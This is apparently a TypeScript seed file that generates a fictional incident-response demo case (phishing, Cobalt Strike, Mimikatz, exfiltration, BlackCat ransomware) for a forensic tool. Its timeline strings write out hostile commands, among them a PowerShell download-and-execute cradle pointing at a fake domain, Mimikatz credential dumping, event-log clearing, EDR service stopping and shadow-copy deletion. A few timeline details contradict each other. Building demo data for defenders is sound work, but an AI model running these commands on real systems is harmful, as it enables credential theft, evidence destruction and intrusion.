...
function ts(day: number, h: number, m = 0, s = 0): string {
  return new Date(
    `2026-05-${String(day).padStart(2, "0")}T${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}.000Z`,
  ).toISOString();
}
...
export async function seedDemoCase(
  ...
  const findings = [
    {
      ...
      description:
        "A Cobalt Strike stager (svchost32.exe, SHA-256 " +
        SHA_BEACON +
        ") was executed on " +
    ...
    },
    {
      ...
      description:
        "Mimikatz (SHA-256 " +
        SHA_MIMIKATZ +
        ") was executed interactively on DC01 under " +
    ...
    },
    {
      ...
      description:
        ...
        "The DLL (SHA-256 " +
        SHA_DROPPER +
        ") loads the Cobalt Strike stager on next logon. " +
    ...
    },
    {
      ...
      description:
        "A ransomware binary (encrypt.exe, SHA-256 " +
        SHA_RANSOM +
        ") was dropped to " +
    ...
    },
    {
      ...
      relatedIocs: ["ioc008"],
      sourceScreenshots: [],
      mitreTechniques: ["T1016", "T1018", "T1069.002", "T1087.001", "T1087.002", "T1482"],
  ...
  const dc01EnumBurst = [
    {
      ...
      sev: "Medium" as const,
      mitre: ["T1087.002"],
      desc: "SharpHound collection launched on DC01 under the PSEXESVC SYSTEM context — LDAP bind, BloodHound 'All' collection method started.",
    },
    {
      m: 5,
      sev: "Low" as const,
      mitre: ["T1087.002"],
      desc: "LDAP query from DC01: enumerate all domain user objects (objectClass=user) — 1,284 accounts returned.",
    },
    {
      m: 9,
      sev: "Low" as const,
      mitre: ["T1018"],
      desc: "LDAP query from DC01: enumerate all domain computer objects (objectClass=computer) — 312 hosts returned.",
    },
    {
      m: 14,
      sev: "Medium" as const,
      mitre: ["T1069.002"],
      desc: "LDAP query from DC01: 'Domain Admins', 'Enterprise Admins', and 'Schema Admins' group membership collected for attack-path mapping.",
    },
    {
      m: 19,
      sev: "Medium" as const,
      mitre: ["T1069.002"],
      desc: "SharpHound ACL collection on DC01: AdminSDHolder and GPO delegation rights enumerated to identify privilege-escalation paths.",
    },
    {
      m: 26,
      sev: "Low" as const,
      mitre: ["T1018"],
      desc: "net view /domain executed on DC01 — domain host inventory and shared resources enumerated.",
    },
    {
      m: 33,
      sev: "Low" as const,
      mitre: ["T1087.001"],
      desc: "net localgroup administrators executed on DC01 — local administrator membership listed.",
    },
    {
      m: 40,
      sev: "Medium" as const,
      mitre: ["T1482"],
      desc: "nltest /domain_trusts /all_trusts executed on DC01 — domain trust relationships mapped.",
    },
    {
      m: 47,
      sev: "Medium" as const,
      mitre: ["T1087.002"],
      desc: "LDAP query from DC01 for accounts with servicePrincipalName set (Kerberoasting target discovery) — 12 service accounts identified.",
    },
    {
      m: 54,
      sev: "Low" as const,
      mitre: ["T1087.002"],
      desc: "SharpHound collection completed on DC01 — results written to C:\\Windows\\Temp\\20260516.bin (BloodHound JSON archive).",
    },
  ].map((t, i) => ({
  ...
  const forensicTimeline = [
    {
      ...
      asset: "WKSTN-JSMITH",
      description:
        "Phishing email received: 'Q1-2026 Invoice — Action Required' from accounts@globaltech-vendor.com with attachment Q1-2026-Invoice.xlsm (22 KB). Spoofed sender; SPF/DKIM failed.",
    },
    {
      id: "e002",
      ...
      action: "execute" as const,
      description:
        "Excel opened Q1-2026-Invoice.xlsm; user clicked 'Enable Content' to run macro. Excel spawned cmd.exe (pid 4812).",
    },
    {
      id: "e003",
      ...
      action: "execute" as const,
      description:
        "cmd.exe spawned powershell.exe with args: -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://cdn-update.microsofttech.net/init.ps1')\"",
    },
    {
      id: "e004",
      ...
      port: 80,
      description:
        "PowerShell downloaded payload from http://cdn-update.microsofttech.net/update/v2/payload.exe → wrote C:\\Windows\\Temp\\svchost32.exe (SHA-256: " +
        SHA_BEACON +
        ")",
    },
    {
      ...
      description:
        "svchost32.exe executed from C:\\Windows\\Temp\\ by powershell.exe (pid 5102). Binary is a Cobalt Strike stager packed with Donut.",
    },
    {
      id: "e006",
      ...
      action: "network_send" as const,
      description:
        "Cobalt Strike beacon established HTTPS C2 to 185.220.101.47:443 (cobaltkit.xyz). First check-in confirmed by firewall egress log. JA3 fingerprint matches CobaltStrike default profile.",
    },
    {
      id: "e007",
      ...
      sources: ["Chainsaw"],
      description:
        "Scheduled task 'MicrosoftEdgeUpdateCore' created (EventID 4698). Action: rundll32.exe C:\\Users\\jsmith\\AppData\\Roaming\\update.dll,Start. Trigger: At logon of any user.",
    },
    {
      id: "e008",
      timestamp: ts(15, 10, 15),
      ...
      action: "write" as const,
      description:
        "update.dll written to C:\\Users\\jsmith\\AppData\\Roaming\\ (SHA-256: " +
        SHA_DROPPER +
        ", 38 KB). DLL loads Cobalt Strike stager reflectively on next logon.",
    },
    {
      id: "e009",
      ...
      description:
        "svchost32.exe injected shellcode into legitimate svchost.exe (pid 788, services: RpcSs). Classic Cobalt Strike process injection via NtQueueApcThread.",
    },
    {
      id: "e010",
      ...
      description:
        'cmd.exe (child of svchost.exe pid 788) ran: nltest /dclist:globaltech.local && net user /domain && net group "Domain Admins" /domain && arp -a',
    },
    {
      id: "e011",
      ...
      asset: "WKSTN-JSMITH",
      description:
        "nltest output confirmed: DC01.globaltech.local (\\\\10.10.20.15) is the primary DC. Domain admin group membership enumerated: 4 members.",
    },
    {
      id: "e012",
      ...
      action: "network_send" as const,
      description:
        "PsExec.exe executed from WKSTN-JSMITH targeting DC01 (10.10.20.15). Command: PsExec.exe \\\\DC01 -s cmd.exe. EventID 4648 on DC01 (explicit credential logon, account: jsmith).",
    },
    {
      id: "e013",
      ...
      sources: ["Chainsaw"],
      description:
        "Service 'PSEXESVC' installed on DC01 (EventID 7045). Image path: %SystemRoot%\\PSEXESVC.exe. Service type: Interactive. Ran as SYSTEM.",
    },
    {
      id: "e014",
      ...
      description:
        "Mimikatz (SHA-256: " +
        SHA_MIMIKATZ +
        ") uploaded to DC01 C:\\Windows\\Temp\\m64.exe and executed under PSEXESVC SYSTEM context.",
    },
    {
      id: "e015",
      ...
      description:
        "Mimikatz sekurlsa::logonpasswords executed on DC01. LSASS process (pid 672) accessed with handle rights 0x1FFFFF. 3 DA accounts + 12 service accounts credential material extracted.",
    },
    {
      id: "e016",
      ...
      description:
        "C2 beacon callback volume increased on WKSTN-JSMITH: 12 HTTPS POST requests to 185.220.101.47 in 5-minute window. Consistent with operator interaction (manual tasking, not automated).",
    },
    {
      id: "e017",
      ...
      action: "network_send" as const,
      description:
        "PsExec lateral movement to FS01 (10.10.20.30) using domain admin credentials. EventID 4648 and 7045 recorded on FS01. Service PSEXESVC created (SYSTEM).",
    },
    {
      id: "e018",
      ...
      action: "network_send" as const,
      description:
        "PsExec lateral movement to WEB01 (10.10.20.40) using domain admin credentials. EventID 4648 and 7045 recorded on WEB01. Service PSEXESVC created (SYSTEM).",
    },
    {
      id: "e042",
      ...
      action: "execute" as const,
      description:
        "DC01 Security and System event logs CLEARED (EventID 1102 — 'the audit log was cleared'). 'wevtutil cl Security' and 'wevtutil cl System' executed under the PSEXESVC SYSTEM context to destroy the 4624/4648/4672/7045 authentication and service-install evidence of the lateral movement and credential dump.",
    },
    {
      id: "e043",
      ...
      action: "execute" as const,
      description:
        "CrowdStrike Falcon sensor tampering on DC01: 'sc stop CSFalconService' issued and real-time protection disabled under SYSTEM. EDR telemetry from DC01 stopped at 10:13 and did not resume until the sensor auto-recovered at 02:15 on May 17 — a ~16-hour blackout immediately after credential theft, overlapping the finance-data staging window.",
    },
    {
      id: "e019",
      ...
      description:
        "DNS query for cobaltkit.xyz resolved to 185.220.101.47 from WKSTN-JSMITH. Overnight C2 beacon activity: 38 callbacks recorded (21:00 May 16 – 08:00 May 17). Attacker maintaining foothold.",
    },
    {
      id: "e020",
      ...
      asset: "FS01",
      description:
        "Recursive copy of \\\\FS01\\Finance$ initiated from DC01 admin session. Files staged to C:\\Windows\\Temp\\backup\\ on FS01. xcopy used with /E /H /C flags. Total: 3,412 files.",
    },
    {
      id: "e021",
      ...
      action: "write" as const,
      description:
        "7-Zip (7z.exe) executed on FS01 to compress C:\\Windows\\Temp\\backup\\ → data.7z with password 'Xk9#mP2$qR'. Archive size: 2.3 GB. Password-protected archive significantly hinders content analysis.",
    },
    {
      id: "e022",
      ...
      action: "network_send" as const,
      description:
        "FTP connection attempt from FS01 to 185.220.101.47:21 for data.7z upload. Blocked by perimeter firewall (outbound FTP rule, policy GFW-DENY-FTP-OUT). FTP blocked in 3 seconds.",
    },
    {
      id: "e023",
      ...
      action: "network_send" as const,
      description:
        "HTTPS POST to 185.220.101.47:443 from FS01 — chunked upload of data.7z. Firewall allowed (HTTPS policy). Session lasted 67 seconds. Bytes sent: ~847 MB before session terminated by firewall threshold.",
    },
    {
      id: "e024",
      ...
      sources: ["Suricata"],
      description:
        "Suricata alert: ET POLICY Large HTTPS Upload Detected (FS01 → 185.220.101.47). Alert triggered at 300 MB threshold. Session continued until session-bytes limit hit at ~847 MB.",
    },
    {
      id: "e025",
      ...
      description:
        "New inbound connection from 185.220.101.47 to beacon on DC01. Operator re-tasked DC01 session for ransomware staging. Increased C2 traffic volume (25 POSTs in 10 min) suggests preparation.",
    },
    {
      id: "e026",
      ...
      count: 3,
      description:
        "Ransomware binary encrypt.exe (SHA-256: " +
        SHA_RANSOM +
    ...
    },
    {
      ...
      path: "c:\\windows\\temp\\encrypt.exe",
      description:
        "CrowdStrike Falcon detected encrypt.exe on first execution attempt on FS01 (behavioral detection: 'Ransomware Activity Detected'). Process terminated in 0.3 seconds. File quarantined.",
    },
    {
      id: "e028",
    ...
    },
    {
      ...
      count: 847,
      description:
        "SIEM alert: Unusual SMB lateral movement volume — 847 SMB connections from WKSTN-JSMITH to 3 hosts in 24 h (May 16). Alert triggered 5 days after activity due to correlation rule delay.",
    },
    {
      id: "e030",
      timestamp: ts(21, 9, 5),
      ...
      description:
        "SIEM alert: DC01 high failed logon count — 214 EventID 4625 in 1 hour (May 16 08:20–08:20). Likely credential spraying or password reuse attempts using Mimikatz-dumped hashes.",
    },
    {
      id: "e031",
      timestamp: ts(22, 8, 0),
      ...
      sources: ["THOR"],
      description:
        "THOR scan of WKSTN-JSMITH completed: detected svchost32.exe (THOR Score 100, CobaltStrike C2), update.dll (THOR Score 90, CobaltStrike loader), and 3 additional suspicious registry keys under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.",
    },
    {
      id: "e039",
      ...
      count: 14,
      description:
        "Suricata IDS alert: Apache path traversal exploitation attempt (CVE-2021-41773) from 185.220.101.47 targeting WEB01:8080 — 14 requests in 60 s matching ET WEB_SERVER Apache 2.4.49 Path Traversal rule.",
    },
    {
      id: "e040",
      ...
      description:
        "CVE-2021-41773 RCE confirmed on WEB01: Apache httpd (pid 3341) spawned cmd.exe (pid 3342) via mod_cgi path traversal. Alternate initial access via web exploitation confirmed independent of the phishing email.",
    },
    {
      id: "e041",
      ...
      action: "network_send" as const,
      description:
        "SIEM alert: JNDI LDAP callback from WEB01 Java process (Tomcat 9, pid 2018) to 185.220.101.47:1389 — matches Log4Shell exploitation pattern (CVE-2021-44228, CVSS 10.0). WEB01 Tomcat application uses Log4j 2.14.1 (unpatched).",
    },
    ...
    // per-hour median across assets stays at 1 and DC01's spike reads as a true rate anomaly.
    {
      ...
      action: "network_send" as const,
      description:
        "DC01 admin session test-mounted \\\\FS01\\Finance$ over SMB to verify access ahead of data staging — single authenticated share connect (EventID 5140).",
    },
    {
      id: "e061",
      timestamp: ts(16, 9, 41),
      severity: "Low",
      mitreTechniques: ["T1071.001"],
      relatedFindingIds: ["f001", "f009"],
      sourceScreenshots: [],
      asset: "WEB01",
      srcIp: "10.10.20.40",
      dstIp: "185.220.101.47",
      ...
      action: "network_send" as const,
      description:
        "Secondary Cobalt Strike beacon on WEB01 (from the CVE-2021-41773 foothold) checked in to 185.220.101.47:443 — single periodic callback.",
    },
    ...dc01EnumBurst,
    ...beaconCheckIns,
  ...
  const superTimeline: ForensicEvent[] = [
    {
      ...
      asset: "WEB01",
      sources: ["EVTX"],
      description: "Apache access log entries",
      message: "Apache mod_cgi path traversal probe pattern observed against /cgi-bin/.%2e/",
    },
    {
      id: "st002",
      timestamp: ts(15, 9, 48),
      ...
      processName: "powershell.exe",
      parentName: "cmd.exe",
      description: "PowerShell EngineState log",
      message:
        "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA",
    },
    {
      id: "st003",
      timestamp: ts(15, 9, 49),
      ...
      path: "c:\\windows\\temp\\svchost32.exe",
      sha256: SHA_BEACON,
      description: "MFT entry — new file",
      message: "$MFT record: C:\\Windows\\Temp\\svchost32.exe created, 84 KB, no digital signature",
    },
    {
      id: "st004",
      timestamp: ts(15, 10, 15),
      ...
      asset: "WKSTN-JSMITH",
      sources: ["EVTX"],
      description: "TaskScheduler operational log",
      message:
        'TaskScheduler 106: Task Scheduler successfully completed task "\\MicrosoftEdgeUpdateCore" , instance "{a1b2c3d4}" , action "C:\\Users\\jsmith\\AppData\\Roaming\\update.dll"',
    },
    {
      id: "st005",
      timestamp: ts(15, 10, 15),
      ...
      sha256: SHA_DROPPER,
      description: "MFT entry — new file",
      message: "$MFT record: C:\\Users\\jsmith\\AppData\\Roaming\\update.dll created, 38 KB",
    },
    {
      id: "st006",
      timestamp: ts(15, 10, 16),
      severity: "Low",
      mitreTechniques: [],
      relatedFindingIds: [],
      sourceScreenshots: [],
      asset: "WKSTN-JSMITH",
      sources: ["EVTX"],
      description: "Registry Run key write",
      path: "hkcu\\software\\microsoft\\windows\\currentversion\\run\\edgeupdatecore",
      message:
        "Registry SetValue: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\EdgeUpdateCore = rundll32.exe C:\\Users\\jsmith\\AppData\\Roaming\\update.dll,Start",
    },
    {
      id: "st007",
      timestamp: ts(16, 8, 22),
      ...
      sources: ["EVTX"],
      description:
        "Windows Security Successful logon (EID 4624) - GLOBALTECH\\jsmith - LogonType=3 - IpAddress=10.10.10.45 - WorkstationName=WKSTN-JSMITH @ DC01 [Network]",
      message:
        "Security-Auditing 4624: An account was successfully logged on. Logon Type:\t\t3 Account Name: jsmith Source Network Address: 10.10.10.45",
    },
    {
      id: "st008",
      timestamp: ts(16, 8, 23),
      ...
      asset: "DC01",
      sources: ["EVTX"],
      description: "Security 7045 — service installed",
      message:
        "Service Control Manager 7045: A service was installed in the system. Service Name: PSEXESVC Service File Name: %SystemRoot%\\PSEXESVC.exe",
    },
    {
      id: "st009",
      timestamp: ts(16, 8, 23),
      ...
      asset: "DC01",
      sources: ["Velociraptor"],
      artifactName: "Windows.Network.Netstat",
      processName: "PSEXESVC.exe",
      parentName: "services.exe",
      description: "PSEXESVC network share access",
      message: "SMB session to \\\\DC01\\ADMIN$ established under PSEXESVC context",
    },
    {
      id: "st010",
      timestamp: ts(16, 8, 43),
      ...
      md5: MD5_MIMIKATZ,
      description: "MFT entry — new file",
      message: "$MFT record: C:\\Windows\\Temp\\m64.exe created, 1.2 MB, unsigned",
    },
    {
      id: "st011",
      timestamp: ts(16, 8, 45),
      ...
      processName: "m64.exe",
      parentName: "PSEXESVC.exe",
      description: "Sysmon EID 10 — process access",
      message:
        "Sysmon 10: ProcessAccess SourceImage: C:\\Windows\\Temp\\m64.exe TargetImage: C:\\Windows\\System32\\lsass.exe GrantedAccess: 0x1FFFFF",
    },
    {
      id: "st012",
      timestamp: ts(16, 9, 5),
      ...
      asset: "DC01",
      sources: ["Velociraptor"],
      artifactName: "Windows.System.Services",
      description: "Kerberoasting target discovery (SPN sweep)",
    ...
    },
    {
      ...
      processName: "wevtutil.exe",
      parentName: "PSEXESVC.exe",
      description: "Security 1102 — audit log cleared",
      message:
        "Security-Auditing 1102: The audit log was cleared. Subject: SYSTEM. Command: wevtutil cl Security",
    },
    {
      id: "st015",
      timestamp: ts(16, 10, 13),
      ...
      processName: "sc.exe",
      parentName: "PSEXESVC.exe",
      description: "EDR sensor tamper",
      message:
        "System log: CSFalconService stopped by SYSTEM via 'sc stop CSFalconService' — real-time protection disabled",
    },
    {
      id: "st016",
      timestamp: ts(16, 9, 22),
      ...
      asset: "FS01",
      sources: ["EVTX"],
      description: "Security 5140 — network share object accessed",
      message:
        "Security-Auditing 5140: A network share object was accessed. Share Name: \\\\*\\C$ Source Address: 10.10.20.15",
    },
    {
      id: "st017",
      timestamp: ts(17, 15, 45),
      ...
      path: "c:\\windows\\temp\\backup\\data.7z",
      description: "MFT entry — new file",
      message: "$MFT record: C:\\Windows\\Temp\\backup\\data.7z created, 2.3 GB",
    },
    {
      id: "st018",
      timestamp: ts(18, 2, 30),
      ...
      dstIp: "185.220.101.47",
      port: 21,
      description: "Zeek ftp.log entry",
      message:
        "FTP connection attempt to 185.220.101.47:21 blocked by perimeter firewall policy GFW-DENY-FTP-OUT",
    },
    {
      id: "st019",
      timestamp: ts(19, 21, 30),
      severity: "Low",
      mitreTechniques: [],
      relatedFindingIds: [],
      sourceScreenshots: [],
      asset: "DC01",
      sources: ["EVTX"],
      description: "System 7040 — VSS service stopped",
      message:
        "Service Control Manager 7040: The start type of the Volume Shadow Copy service was changed from auto start to disabled",
    },
    {
      id: "st020",
      timestamp: ts(19, 21, 32),
      severity: "Low",
      mitreTechniques: [],
      relatedFindingIds: [],
      sourceScreenshots: [],
      ...
      message: "Sysmon 1: CommandLine: vssadmin delete shadows /all /quiet",
    },
    {
      id: "st021",
      timestamp: ts(19, 22, 15),
      ...
      sha256: SHA_RANSOM,
      description: "MFT entry — new file",
      message: "$MFT record: C:\\Windows\\Temp\\encrypt.exe created, 512 KB, unsigned",
    },
    {
      id: "st022",
      timestamp: ts(20, 7, 5),
      ...
      sources: ["EVTX"],
      description:
        "Windows Security Successful logon (EID 4624) - GLOBALTECH\\svc-admin - LogonType=10 - IpAddress=10.10.20.15 - WorkstationName=DC01 @ WEB01 [RemoteInteractive/RDP from 10.10.20.15]",
      message:
        "Security-Auditing 4624: An account was successfully logged on. Logon Type:\t\t10 Account Name: svc-admin Source Network Address: 10.10.20.15",
    },
    {
      id: "st023",
      timestamp: ts(20, 7, 6),
      ...
      sources: ["EVTX"],
      port: 3389,
      description: "TerminalServices-RemoteConnectionManager operational log",
      message: "TerminalServices-RemoteConnectionManager 1149: RDP-Tcp session established from 10.10.20.15",
    },
    {
      id: "st024",
      timestamp: ts(15, 9, 47),
      ...
      description: "Sysmon EID 1 — process create",
      message:
        "Sysmon 1: ParentImage: C:\\...\\EXCEL.EXE Image: C:\\Windows\\System32\\cmd.exe CommandLine: cmd.exe /c powershell.exe -NoProfile -WindowStyle Hidden",
    },
    // 4624/4625 logon rows in the exact mapWindows() description shape (like st007/st022 above) so
    // parseLoginEvent() picks them up and the Login Graph section has demo data out of the box:
    // multiple accounts × hosts, Interactive/Network/Service logon types, a failed-logon burst
    // (dashed red edge), a runas /netonly logon (risk-orange edge), and a machine-account noise
    // row for the "hide machine/system-session accounts" filter. Same story as the curated
    // timeline: jsmith's PsExec hop to DC01, the admin-deploy fan-out to FS01/WEB01, the
    // svc-backup spray flagged by SIEM alert e030.
    {
      id: "st027",
      timestamp: ts(15, 8, 5),
      severity: "Low",
      ...
      sources: ["EVTX"],
      description:
        "Windows Security Successful logon (EID 4624) - GLOBALTECH\\jsmith - LogonType=2 @ WKSTN-JSMITH [Interactive]",
      message:
        "Security-Auditing 4624: An account was successfully logged on. Logon Type:\t\t2 Account Name: jsmith — console logon at start of business day",
    },
    {
      id: "st028",
      timestamp: ts(16, 8, 23),
      ...
      sources: ["EVTX"],
      description:
        "Windows Security Successful logon (EID 4624) - NT AUTHORITY\\SYSTEM - LogonType=5 @ DC01 [Service]",
      message:
        "Security-Auditing 4624: An account was successfully logged on. Logon Type:\t\t5 Account Name: SYSTEM — PSEXESVC service logon",
    },
    {
      id: "st029",
      timestamp: ts(16, 8, 20),
      severity: "Low",
      mitreTechniques: [],
      relatedFindingIds: [],
      sourceScreenshots: [],
      ...
      sources: ["EVTX"],
      count: 214,
      endTimestamp: ts(16, 9, 20),
      description:
        "Windows Security Failed logon (EID 4625) - GLOBALTECH\\svc-backup - LogonType=3 - IpAddress=10.10.10.45 - WorkstationName=WKSTN-JSMITH @ DC01",
      message:
        "Security-Auditing 4625: An account failed to log on. Logon Type:\t\t3 Account Name: svc-backup Source Network Address: 10.10.10.45 — 214 failures in 1 h (SIEM alert e030)",
    },
    {
      id: "st030",
      timestamp: ts(16, 9, 58),
      severity: "Low",
      mitreTechniques: [],
      relatedFindingIds: [],
      sourceScreenshots: [],
      ...
      sources: ["EVTX"],
      description:
        "Windows Security Successful logon (EID 4624) - GLOBALTECH\\admin-deploy - LogonType=9 @ WKSTN-JSMITH [NewCredentials]",
      message:
        "Security-Auditing 4624: An account was successfully logged on. Logon Type:\t\t9 Account Name: admin-deploy — runas /netonly with the dumped domain-admin credentials ahead of the 10:00 PsExec fan-out",
    },
    {
      id: "st031",
      timestamp: ts(16, 10, 0),
      ...
      sources: ["EVTX"],
      description:
        "Windows Security Successful logon (EID 4624) - GLOBALTECH\\admin-deploy - LogonType=3 - IpAddress=10.10.10.45 - WorkstationName=WKSTN-JSMITH @ FS01 [Network]",
      message:
        "Security-Auditing 4624: An account was successfully logged on. Logon Type:\t\t3 Account Name: admin-deploy Source Network Address: 10.10.10.45 — PsExec lateral movement to FS01",
    },
    {
      id: "st032",
      timestamp: ts(16, 10, 5),
      ...
      sources: ["EVTX"],
      description:
        "Windows Security Successful logon (EID 4624) - GLOBALTECH\\admin-deploy - LogonType=3 - IpAddress=10.10.10.45 - WorkstationName=WKSTN-JSMITH @ WEB01 [Network]",
      message:
        "Security-Auditing 4624: An account was successfully logged on. Logon Type:\t\t3 Account Name: admin-deploy Source Network Address: 10.10.10.45 — PsExec lateral movement to WEB01",
    },
    {
      id: "st033",
      timestamp: ts(16, 8, 21),
      severity: "Low",
      mitreTechniques: [],
      relatedFindingIds: [],
      sourceScreenshots: [],
      ...
      sources: ["EVTX"],
      description:
        "Windows Security Successful logon (EID 4624) - GLOBALTECH\\WKSTN-JSMITH$ - LogonType=3 - IpAddress=10.10.10.45 @ DC01 [Network]",
      message:
        "Security-Auditing 4624: An account was successfully logged on. Logon Type:\t\t3 Account Name: WKSTN-JSMITH$ — routine machine-account authentication",
    },
    ...
    // shows non-matches instead of tagging 100% of the timeline.
    {
      ...
      asset: "FS01",
      sources: ["EVTX"],
      description: "Scheduled Windows Update check",
      message: "Microsoft-Windows-WindowsUpdateClient: Installation successful for update KB5041234",
    },
    {
      id: "st026",
      timestamp: ts(15, 6, 30),
      severity: "Info",
      mitreTechniques: [],
      relatedFindingIds: [],
      sourceScreenshots: [],
      asset: "DC01",
      sources: ["EVTX"],
      description: "Routine backup job",
      message: "Backup Exec: Nightly full backup of \\\\DC01\\SYSVOL completed successfully",
    },
  ];
    ...
    openThreads: [
      {
        id: "t001",
        description:
          "Confirm full lateral movement scope — are any hosts beyond DC01, FS01, and WEB01 compromised? SIEM east-west traffic analysis pending.",
        status: "open",
        openedAt: ts(22, 10, 0),
        closedAt: null,
      },
      {
        id: "t002",
        description:
          "Quantify exact exfiltrated data contents. Firewall logs show ~847 MB via HTTPS on May 18. Finance file share inventory needed.",
        status: "open",
        openedAt: ts(22, 10, 5),
        closedAt: null,
      },
      {
        id: "t003",
        description:
          "Determine initial access vector and whether the phishing email was targeted or opportunistic.",
        status: "closed",
        openedAt: ts(22, 9, 0),
    ...
    keyQuestions: [
      {
        ...
        status: "answered",
        answer:
          "Spear-phishing email delivered to jsmith@globaltech.com on May 15 09:14. Malicious Excel macro (.xlsm) executed on open. Sender spoofed as accounts@globaltech-vendor.com.",
      ...
      },
      {
        ...
        status: "answered",
        answer:
          "Scheduled task 'MicrosoftEdgeUpdateCore' created May 15 10:15. Task runs update.dll at every user logon via rundll32.exe.",
      ...
      },
      {
        ...
        status: "partial",
        answer:
          "Three domain administrator accounts confirmed compromised via Mimikatz on DC01 (May 16 08:45). Twelve service account NTLMs also extracted. Specific account names pending customer confirmation.",
      ...
      },
      {
        ...
        status: "partial",
        answer:
          "~847 MB transferred via HTTPS to 185.220.101.47 on May 18 02:30–02:31. Source was C:\\Windows\\Temp\\backup\\data.7z (2.3 GB staged from \\\\FS01\\Finance$). Exact file contents not yet determined.",
      ...
      },
      {
        ...
        status: "partial",
        answer:
          "Ransomware deployment (encrypt.exe / BlackCat-ALPHV) on May 19 22:15 indicates a double-extortion ransomware attack. EDR blocked encryption.",
      ...
      },
      {
        ...
        status: "unknown",
        answer: "",
        pointer: "Review email gateway logs, DNS query logs, and proxy logs for weeks before May 15",
      },
      {
        id: "q008",
        ...
        answer: "",
        pointer:
          "Run THOR/Chainsaw on all three lateral hosts; check scheduled tasks, services, registry run keys, and WMI subscriptions",
      },
    ],
    nextSteps: [
      {
        ...
        rationale:
          "The Cobalt Strike beacon origin workstation may still have an active C2 channel. Disk image needed to recover the full macro, stager, and PowerShell command history.",
        pointer: "WKSTN-JSMITH; C:\\Windows\\Temp\\svchost32.exe",
      },
      {
        id: "ns002",
        priority: "critical",
        action:
          "Reset all domain admin and service account passwords, revoke Kerberos tickets (krbtgt rotation)",
        rationale:
          "Three domain admin NTLMs and 12 service account credentials confirmed dumped from LSASS. krbtgt double-reset prevents Golden Ticket persistence.",
      ...
      },
      {
        ...
        rationale:
          "EventID 4648 (explicit credential logon) and 7045 (service install) will confirm the full PsExec lateral movement path.",
      ...
      },
      {
        ...
        rationale:
          "cobaltkit.xyz and cdn-update.microsofttech.net may have resolved from hosts other than WKSTN-JSMITH.",
      ...
      },
      {
        ...
        rationale:
          "Lateral movement confirmed to both hosts. Initial implant install and additional persistence mechanisms not yet inventoried.",
      ...
      },
      {
        ...
        rationale:
          "The 847 MB exfiltration came from this staging directory. File listing and timestamps will scope the data breach notification obligation.",
        pointer: "FS01; C:\\Windows\\Temp\\backup\\; Finding f005",
      },
    ],
    uncertainties: [
      {
        topic: "Initial access vector (web exploit vs phishing)",
        status: "inferred",
        basis:
          "WEB01 exploitation (CVE-2021-41773 + Log4Shell) and the phishing macro both landed May 15; the delivered .eml was not recovered.",
        gap: "Recover the mail-gateway logs / delivered email to confirm which vector achieved the first foothold.",
      },
      {
        topic: "Domain-admin credential theft",
        status: "confirmed",
        basis: "Mimikatz execution on DC01 and 3 domain-admin NTLMs dumped from LSASS (finding f002).",
        gap: "",
      },
      {
        topic: "Volume of data exfiltrated (~847 MB)",
        status: "inferred",
        basis:
          "Suricata flagged an HTTPS upload May 18; the 2.3 GB staging archive data.7z was recovered but the on-wire transfer size is estimated.",
        gap: "Correlate FS01 SRUM per-app bytes with the proxy/firewall egress record to confirm the exact exfiltrated volume.",
      },
      {
        topic: "Attribution to ALPHV/BlackCat affiliate",
        status: "speculated",
        basis:
          "TTP overlap (Cobalt Strike + PsExec + staged .7z) resembles the group; no confirmed group-specific infrastructure or signed tooling.",
        gap: "Pivot the C2 IPs/domains through CTI to establish attributable infrastructure overlap.",
      },
      {
        topic: "Ransomware ever executed",
        status: "confirmed",
        basis:
          "encrypt.exe was blocked by the EDR on all three targets; no files encrypted and no ransom note written.",
        gap: "",
      },
    ],
    forensicTimeline,
    timeline: [
      {
        ...
        windowSequence: 1,
        description:
          "Analyst reviewed EDR alert dashboard — CrowdStrike ransomware block alerts on DC01, FS01, WEB01. Opened incident case.",
        sourceScreenshots: [],
      },
      {
        ...
        windowSequence: 2,
        description:
          "Reviewed Suricata HTTPS upload alert from May 18. Confirmed data.7z exfiltration to C2 IP. Added C2 IP and domain as IOCs.",
        sourceScreenshots: [],
      },
      {
        ...
        windowSequence: 3,
        description:
          "Imported THOR scan results (WKSTN-JSMITH). Beacon and loader identified. Timeline updated with 12 new events.",
        sourceScreenshots: [],
      },
      {
        ...
        windowSequence: 4,
        description:
          "Ran Chainsaw on DC01 EVTX export. Confirmed PsExec, Mimikatz execution, and PSEXESVC service install. 19 new events added.",
        sourceScreenshots: [],
      },
      {
        ...
        windowSequence: 5,
        description:
          "Ran synthesis. Attacker path reconstructed end-to-end. 8 findings produced (2 Critical, 3 High, 2 Medium, 1 Low). Credentials compromise and exfiltration flagged.",
        sourceScreenshots: [],
      },
    ],
  };
  ...
  await write(join(caseDir, "state", "enrich-control.json"), {
  ...
  await write(join(caseDir, "state", "tags.json"), [
    ...
    },
    {
      ...
      label: "confirmed-malicious",
      author: "Demo Analyst",
      createdAt: "2026-05-22T10:21:00.000Z",
    },
    {
      id: "tag004",
      targetType: "ioc",
    ...
    },
    {
      ...
      label: "key-evidence",
      author: "Demo Analyst",
      createdAt: "2026-05-22T10:23:00.000Z",
    },
    {
      id: "tag008",
      targetType: "event",
    ...
    },
    {
      ...
      label: "confirmed-malicious",
      author: "Demo Analyst",
      createdAt: "2026-05-22T10:26:00.000Z",
    },
    {
      id: "tag015",
      targetType: "finding",
    ...
    },
    {
      ...
      label: "needs-review",
      author: "Demo Analyst",
      createdAt: "2026-05-22T10:27:00.000Z",
    },
    {
      id: "tag017",
      targetType: "event",
  ...
  await write(join(caseDir, "state", "comments.json"), [
    ...
    },
    {
      ...
      targetId: "e023",
      author: "Demo Analyst",
      text: "HTTPS session terminated by the firewall's 1 GB per-session egress policy at 847 MB. The remaining ~1.4 GB of the 2.3 GB archive was not sent. However, the first 847 MB likely contains the most recently modified files.",
    ...
    },
    {
      ...
      targetId: "f007",
      author: "Demo Analyst",
      text: "BlackCat/ALPHV ransomware confirmed via YARA match (rule BlackCat_strings_v2). The binary uses Rust, matches the ALPHV encryptor profile with UUID-based marker files. EDR stopped the encrypt phase.",
  ...
